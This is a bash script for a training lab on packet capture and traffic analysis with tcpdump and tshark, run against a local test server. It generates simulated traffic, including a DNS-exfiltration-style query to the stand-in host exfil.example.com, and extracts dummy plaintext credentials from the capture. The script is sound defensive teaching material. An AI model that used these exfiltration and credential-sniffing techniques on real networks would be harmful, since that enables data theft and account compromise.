#!/usr/bin/env bash
# Lab 43 — Packet Capture and Traffic Analysis with tcpdump and tshark
# Auto-assembled from the lab README's command blocks. Review before running.
# Run on the Killercoda Ubuntu Playground: https://killercoda.com/playgrounds/scenario/ubuntu
set -uo pipefail
export DEBIAN_FRONTEND=noninteractive

echo '=== block 1 ==='
apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark dnsutils curl python3
mkdir -p /root/pcap

echo '=== block 2 ==='
mkdir -p /root/www && echo "<h1>intranet</h1>" > /root/www/index.html
nohup python3 -m http.server 8080 --bind 127.0.0.1 --directory /root/www >/dev/null 2>&1 &
sleep 1
nohup tcpdump -i any -U -s 0 -w /root/pcap/lab43.pcap 'tcp port 8080 or port 53' >/root/pcap/tcpdump.log 2>&1 &
sleep 2; cat /root/pcap/tcpdump.log

echo '=== block 3 ==='
curl -s -u alice:Summer2026 http://127.0.0.1:8080/ >/dev/null
curl -s -d 'username=bob&password=Winter2026' http://127.0.0.1:8080/login >/dev/null
dig +short example.com; dig +short www.wikipedia.org
dig +short "$(head -c 24 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z').exfil.example.com" || true
for i in 1 2 3 4 5; do curl -s "http://127.0.0.1:8080/?id=host42&seq=$i" >/dev/null; sleep 2; done

echo '=== block 4 ==='
pkill -INT tcpdump; sleep 1
tcpdump -r /root/pcap/lab43.pcap -nn 2>/dev/null | wc -l
capinfos /root/pcap/lab43.pcap | grep -E 'Number of packets|Capture duration|File size'
tshark -r /root/pcap/lab43.pcap -q -z io,phs 2>/dev/null

echo '=== block 5 ==='
tshark -r /root/pcap/lab43.pcap -Y 'http.request' -T fields -e frame.time_relative -e ip.src -e http.request.method -e http.request.uri 2>/dev/null
tshark -r /root/pcap/lab43.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name 2>/dev/null | sort -u
tshark -r /root/pcap/lab43.pcap -Y 'tcp.port == 8080 && tcp.flags.syn == 1 && tcp.flags.ack == 0' 2>/dev/null | wc -l

echo '=== block 6 ==='
tshark -r /root/pcap/lab43.pcap -q -z follow,tcp,ascii,0 2>/dev/null | sed -n '1,25p'

echo '=== block 7 ==='
tshark -r /root/pcap/lab43.pcap -Y 'http.authorization' -T fields -e ip.src -e http.authorization -e http.authbasic 2>/dev/null
echo 'YWxpY2U6U3VtbWVyMjAyNg==' | base64 -d; echo
tshark -r /root/pcap/lab43.pcap -Y 'http.request.method == "POST"' -T fields -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value 2>/dev/null

echo '=== block 8 ==='
tshark -r /root/pcap/lab43.pcap -q -z conv,tcp 2>/dev/null | head -15
tshark -r /root/pcap/lab43.pcap -T fields -E separator=, -e ip.src -e ip.dst -e tcp.dstport -e udp.dstport -e frame.len 2>/dev/null \
  | awk -F, '{k=$1" -> "$2":"$3$4; p[k]++; b[k]+=$5} END {for (k in p) printf "%-40s pkts=%-4d bytes=%d\n", k, p[k], b[k]}' | sort

echo '=== block 9 ==='
tshark -r /root/pcap/lab43.pcap -Y 'http.request.uri contains "id=host42"' -T fields -e frame.time_relative 2>/dev/null \
  | awk 'NR>1 {printf "interval %.1f s\n", $1-prev} {prev=$1}'
tshark -r /root/pcap/lab43.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name 2>/dev/null \
  | sort -u | awk '{n=split($1,l,"."); printf "%-4d %s\n", length(l[1]), $1}' | sort -nr | head -3

echo '=== block 10 ==='
test -s /root/pcap/lab43.pcap && echo "PCAP saved"
tshark -r /root/pcap/lab43.pcap -Y 'http.request' 2>/dev/null | wc -l
tshark -r /root/pcap/lab43.pcap -Y 'http.authbasic' -T fields -e http.authbasic 2>/dev/null
